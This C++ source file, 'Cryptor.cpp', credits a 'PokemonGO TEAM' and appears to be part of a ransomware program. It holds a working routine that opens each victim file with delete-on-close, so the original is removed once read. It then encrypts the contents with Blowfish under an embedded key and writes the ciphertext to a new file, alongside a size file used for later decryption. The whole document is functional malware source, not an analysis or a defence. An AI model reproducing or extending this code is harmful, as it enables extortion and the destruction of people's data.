/*
 * Cryptor.cpp
 *
 * Cryto-Working file
 *
 * COPYRIGHT (C) 2019 PokemonGO TEAM
 * pokemongo.icu
 */

#include "Cryptor.h"
#include <Windows.h>
#include "../Lib/TextUtils.h"
#include "Blowfish.h"

QWORD get_file_size_fromfl_name(String filename_size)
{
	BYTE buff[8];
	const auto h_inp_file = CreateFileW(filename_size.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
	if (h_inp_file == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	DWORD read_len = 0;

	QWORD file_size = 0;

	if(ReadFile(h_inp_file, buff, 8, &read_len, nullptr))
	{
		memcpy(&file_size, &buff, 8);
	}
	CloseHandle(h_inp_file);
	return file_size;
}

void write_file_size_fromfl_name(String filename_size, QWORD size)
{
	const auto h_out_file = CreateFileW(filename_size.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_ENCRYPTED, nullptr);
	if (h_out_file == INVALID_HANDLE_VALUE)
	{
		printf("Cannot open output file!\n");
		return;
	}

	BYTE buffer[8];
	DWORD written;

	memcpy(&buffer, &size, 8);

	if (!WriteFile(h_out_file, buffer, 8, &written, nullptr))
	{
		return;
	}

	CloseHandle(h_out_file);
}

void Cryptor::crypt_func(const String& filename, const String& filename2, const bool is_decrypt)
{
	auto key_str_string = TextUtils::w_convert_to_string(__EncryptKey);
	const auto key_str = key_str_string.c_str();
	const auto unsigned_key_str = reinterpret_cast<const unsigned char *>(key_str);
	const auto len = __EncryptKey.size();

	CBlowFish m_blow_fish(const_cast<unsigned char*>(unsigned_key_str), len);

	const auto h_inp_file = CreateFileW(filename.c_str(), GENERIC_READ , FILE_SHARE_READ , nullptr, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN | FILE_FLAG_DELETE_ON_CLOSE , nullptr);
	if (h_inp_file == INVALID_HANDLE_VALUE) 
	{
		return;
	}

	const DWORD h_out_flags = is_decrypt ? FILE_ATTRIBUTE_NORMAL : FILE_ATTRIBUTE_ENCRYPTED;

	const auto h_out_file = CreateFileW(filename2.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, h_out_flags, nullptr);
	if (h_out_file == INVALID_HANDLE_VALUE)
	{
		return;
	}
	const DWORD chunk_size = BLOCK_LEN;
	BYTE chunk[BLOCK_LEN] = { 0 };
	DWORD out_len = 0;

	QWORD read_total_size = 0;

	_LARGE_INTEGER f_size;
	GetFileSizeEx(h_inp_file, &f_size);
	const QWORD input_size = f_size.QuadPart;

	QWORD original_input_size = 0;

	if (is_decrypt)
	{
		original_input_size = get_file_size_fromfl_name(filename + L"SIZE");
	}
	else
	{
		write_file_size_fromfl_name(filename2 + L"SIZE", input_size);
	}

	auto is_final = false;
	BOOL b_result;
	while ((b_result = ReadFile(h_inp_file, chunk, chunk_size, &out_len, nullptr))) 
	{
		if (0 == out_len) {
			break;
		}

		read_total_size += out_len;
		if (!is_final)
		{
			if(input_size == read_total_size)
			{
				is_final = true;
				if (!is_decrypt)
				{
					while (out_len % 8 != 0)
					{
						out_len++; // HOOK TO ENCRYPT LAST CHUNK..... On decrypt adds 0x00 on end of file.
					}
				}
				else if(original_input_size != 0) // only decrypt
				{
					out_len -= input_size - original_input_size; //added bytes remove on end file.
				}
			}
		}

		if (is_decrypt)
		{
			m_blow_fish.Decrypt(chunk, chunk_size, CBlowFish::CBC);
		}
		else
		{
			m_blow_fish.Encrypt(chunk, chunk_size, CBlowFish::CBC);
		}
		DWORD written = 0;
		if (!WriteFile(h_out_file, chunk, out_len, &written, NULL))
		{
			break;
		}
		memset(chunk, 0, chunk_size);
	}

	CloseHandle(h_inp_file);
	CloseHandle(h_out_file);
}